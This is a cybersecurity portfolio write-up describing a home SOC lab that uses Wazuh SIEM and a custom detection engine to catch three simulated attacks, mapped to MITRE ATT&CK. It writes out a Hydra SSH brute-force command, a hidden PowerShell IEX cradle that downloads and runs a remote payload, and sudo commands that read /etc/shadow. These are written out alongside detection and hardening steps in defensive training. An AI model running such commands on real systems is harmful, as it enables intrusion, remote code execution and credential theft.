# Building a Tier 1 SOC Analyst Lab: Automated Threat Detection, Wazuh SIEM & MITRE ATT&CK Mapping

> **Author:** Mohamed Sabry  
> **Focus:** SOC Operations, SIEM Detection, Threat Hunting, ThreatScope Analysis, MITRE ATT&CK  
> **Repository:** [https://github.com/0xsabry/soc-lab-project](https://github.com/0xsabry/soc-lab-project)  
> **Live Report:** [https://0xsabry.github.io/soc-lab-project/](https://0xsabry.github.io/soc-lab-project/)

---

![SOC Lab Cover](https://raw.githubusercontent.com/0xsabry/soc-lab-project/main/images/image4.png)

## Introduction

In modern Security Operations Centers (SOC), Tier 1 analysts must quickly detect, investigate, map, and mitigate adversary techniques before an initial foothold escalates into a full-scale domain breach.

As part of my cybersecurity portfolio, I built an automated **SOC Analyst Threat Detection & Incident Response Lab**. This project combines **Wazuh SIEM 4.14.4** for live endpoint telemetric monitoring with **ThreatScope v3.0.0** — a custom threat detection engine — to simulate, detect, investigate, and respond to real-world attack vectors across Linux and Windows environments.

In this writeup, I’ll walk through how I executed **3 realistic attack scenarios**, ingested **740+ security events**, mapped behavior to **12 MITRE ATT&CK techniques**, and produced actionable threat intelligence and remediation guidance.

---

## 1. SOC Lab Architecture & Environment Setup

The lab environment was designed in an isolated virtual network to simulate an enterprise SOC deployment:

```text
┌──────────────────────────┐       ┌──────────────────────────┐
│ Windows Host             │       │ Wazuh SIEM 4.14.4        │
│ • ThreatScope Engine     │──────▶│ • Manager & Dashboard    │
│ • PowerShell simulation  │       │ • Alerting & Hunting     │
└────────────┬─────────────┘       └────────────▲─────────────┘
             │                                    │
             │              Wazuh Agent           │
┌────────────▼─────────────┐                      │
│ Ubuntu Server 24.04 LTS  │──────────────────────┘
│ • Monitored Endpoint     │
│ • SSH / Sudo Scenarios   │
└────────────▲─────────────┘
             │
┌────────────┴─────────────┐
│ WSL2 (Kali Linux)        │
│ • Hydra Attack Tooling   │
└──────────────────────────┘
```

### Infrastructure Components
- **SIEM Platform:** Wazuh Manager & Dashboard (v4.14.4)
- **Monitored Endpoint:** Ubuntu Server 24.04 LTS with Wazuh Agent
- **Threat Engine:** ThreatScope v3.0.0 (144 built-in detection rules + Sigma support)
- **Attack Platform:** Kali Linux / WSL2 (Hydra, PowerShell IEX cradles, privilege abuse)
- **Framework:** MITRE ATT&CK v14

---

## 2. Attack Scenario 1: SSH Password Brute-Force Detection

### The Attack Simulation
From the attacker machine (WSL2 Kali), I launched a dictionary-based SSH brute-force attack against the monitored Ubuntu Server endpoint using **Hydra**:

```bash
hydra -l victim_user -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 4
```

### SIEM Detection & Telemetry Analysis
The Wazuh Agent captured the authentication flood in `/var/log/auth.log` and forwarded telemetry to the Wazuh Manager. 

![SSH Brute Force Detection](https://raw.githubusercontent.com/0xsabry/soc-lab-project/main/images/image3.png)

- **Total Events Ingested:** 339 security events
- **Triggered Wazuh Rules:** Rule `5710` (Attempt to login using failed password) and Rule `5712` (SSHD brute force attack detected).
- **MITRE ATT&CK Mapping:** Credential Access — `T1110` (Brute Force) & `T1110.001` (Password Guessing).

### Tier 1 Analyst Response & Hardening
1. **Source Isolation:** Identify external attacking IP (`192.168.1.105`) and block via firewall/fail2ban.
2. **Account Audit:** Verify that no valid authentication occurred during the dictionary flood.
3. **Remediation:** Enforce SSH key-based authentication (`PasswordAuthentication no`), disable root login (`PermitRootLogin no`), and configure port rate limiting.

---

## 3. Attack Scenario 2: PowerShell Download Cradle & Fileless Malware Analysis

### The Attack Simulation
On the Windows endpoint, I simulated an obfuscated PowerShell `IEX` (Invoke-Expression) fileless download cradle attempting to pull down a remote payload:

```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')"
```

### ThreatScope Analysis & IOC Extraction
I exported Windows PowerShell Operational Event Logs (`Event ID 4104` — Script Block Logging) and parsed them using **ThreatScope v3.0.0**.

![ThreatScope PowerShell Analysis Report](https://raw.githubusercontent.com/0xsabry/soc-lab-project/main/images/image8.png)

- **Log Lines Processed:** 1,008 lines
- **Assessed Threat Score:** **CRITICAL**
- **Rules Triggered:** 8 detection rules (including Obfuscation, Download Cradle, WebClient execution)
- **IOCs Extracted:** 16 Indicators of Compromise (C2 IP addresses, suspicious domain strings, payload hashes)
- **Threat Intel Export:** Auto-generated STIX 2.1 JSON bundle and analyst report.

### Tier 1 Analyst Response & Hardening
1. **Host Containment:** Isolate host from corporate network via EDR agent.
2. **IOC Threat Hunting:** Query SIEM for extracted C2 IPs across all enterprise endpoints.
3. **Remediation:** Enforce PowerShell Constrained Language Mode, enable Script Block Logging, and deploy WDAC/AppLocker execution policies.

---

## 4. Attack Scenario 3: Post-Exploitation Sudo Privilege Escalation

### The Attack Simulation
Following an initial foothold on the Ubuntu server, post-exploitation behavior was simulated by abusing `sudo` entitlements to gain root access and access `/etc/shadow`:

```bash
sudo -l
sudo su root
cat /etc/shadow
```

### SIEM Detection & Telemetry Analysis
Wazuh captured the privilege escalation attempt in real time via PAM and auditd integration:

![Privilege Escalation Detection](https://raw.githubusercontent.com/0xsabry/soc-lab-project/main/images/image12.png)

- **Total Events Ingested:** 407 security events
- **Triggered Wazuh Rules:** Rule `5402` (Successful sudo execution) and Rule `5501` (PAM session opened for root).
- **MITRE ATT&CK Mapping:** Privilege Escalation — `T1548.003` (Sudo and Sudo Caching) & `T1134` (Access Token Manipulation).

---

## 5. Summary of MITRE ATT&CK Matrix Coverage

Across the 3 simulated scenarios, the combined SOC detection workflow successfully identified **12 adversary techniques across 6 ATT&CK tactics**:

| Tactic | Technique ID | Technique Name | Detection Mechanism |
| --- | --- | --- | --- |
| **Credential Access** | `T1110.001` | Password Guessing | Wazuh Rule 5712 (SSH Brute Force) |
| **Execution** | `T1059.001` | PowerShell Command Execution | ThreatScope Rule PS-008 & Event ID 4104 |
| **Privilege Escalation** | `T1548.003` | Sudo and Sudo Caching | Wazuh Rule 5402 (PAM Sudo Session) |
| **Defense Evasion** | `T1027` | Obfuscated Files or Information | ThreatScope Obfuscation Engine |
| **Persistence** | `T1505.003` | Web Shell Payload | ThreatScope WebShell Rules |
| **Command & Control** | `T1090.003` | Multi-hop Proxy C2 | ThreatScope IOC Extraction |

---

## Conclusion & Project Links

This SOC Lab project demonstrates how SIEM telemetry, threat-hunting engines, and framework mapping combine to form an effective defense posture.

Explore the complete interactive project, live web dashboard, and PDF reports below:

- 🌐 **Live Interactive SOC Report:** [https://0xsabry.github.io/soc-lab-project/](https://0xsabry.github.io/soc-lab-project/)
- 🐙 **GitHub Repository:** [https://github.com/0xsabry/soc-lab-project](https://github.com/0xsabry/soc-lab-project)
- 📄 **Full SOC PDF Report:** [Download PDF](https://raw.githubusercontent.com/0xsabry/soc-lab-project/main/SOC_Lab_Project_0xSABRY.pdf)

---
*Thank you for reading! Connect with me on [LinkedIn](https://www.linkedin.com/) or explore my cybersecurity repositories on [GitHub](https://github.com/0xsabry).*
